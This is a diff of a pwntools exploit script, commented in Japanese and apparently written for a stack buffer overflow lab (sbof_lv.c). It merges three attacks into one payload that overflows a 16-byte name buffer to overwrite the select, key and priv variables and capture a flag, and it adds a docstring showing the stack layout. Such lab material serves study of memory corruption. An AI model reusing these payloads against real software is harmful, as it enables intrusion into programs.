@@ -12,38 +12,39 @@ context.log_level = 'debug'  # または 'info'
 
 binf = ELF(bin_file)
 
-# selectの書き換え
-def attack_32_9(conn, **kwargs):
-    exploit = 'a'*0x10+'H4cked!'
-    conn.sendline(exploit)
-    print(conn.recvall().decode())
+"""
+■対象ソースコード
+・sbof_lv.c
 
-# keyの書き換え
-def attack_32_10(conn, **kwargs):
-    exploit =  b'a' * 0x10 + b'H4cked!'.ljust(0x14, b'\x00')
-    exploit += b'\xef\xbe\xad\xde'
-    conn.sendline(exploit)
-    print(conn.recvall().decode())
+■脆弱性
+・標準入力で、以下のローカル変数に書き込みできるが、nameが16byteしかないため、
+  スタックバッファーオーバーフローする。
+	char name[0x10]
 
-# privの書き換え →フラグ取得成功
-def attack_32_11(conn, **kwargs):
-    exploit =  b'a' * 0x10 + b'H4cked!'.ljust(0x14, b'\x00')
-    exploit += struct.pack('<IQ', 0xdeadbeef, 0x40204b)
+■スタックのメモリ配置
+			┌───────────────────────┐
+	-0x30	│					name						│
+			├───────────────────────┤
+	-0x20	│					secret						│
+			├─────┬─────┬───────────┤
+	-0x10	│			│	key		│		priv			│
+			├─────┴─────┼───────────┤
+	rbp		│	saved rbp			│	return 	address		│
+			└───────────┴───────────┘
+"""
+
+def attack_32_9_11(conn, **kwargs):
+    exploit  = b'a' * 0x10						# nameへの書き込み
+    exploit += b'H4cked!'.ljust(0x14, b'\x00')	# selectへの書き込み
+    exploit += struct.pack('<I', 0xdeadbeef)	# keyへの書き込み
+    exploit += struct.pack('<Q', 0x40204b)		# privへの書き込み
     conn.sendline(exploit)
     print(conn.recvall().decode())
 
 def main():
-    print('### attack_32_9 ###')
+    print('### attack_32_9_11 ###')
     conn = process(bin_file)
-    attack_32_9(conn)
-    
-    print('### attack_32_10 ###')
-    conn = process(bin_file)
-    attack_32_10(conn)
-    
-    print('### attack_32_11 ###')
-    conn = process(bin_file)
-    attack_32_11(conn)
+    attack_32_9_11(conn)
 
 if __name__=='__main__':
     main()
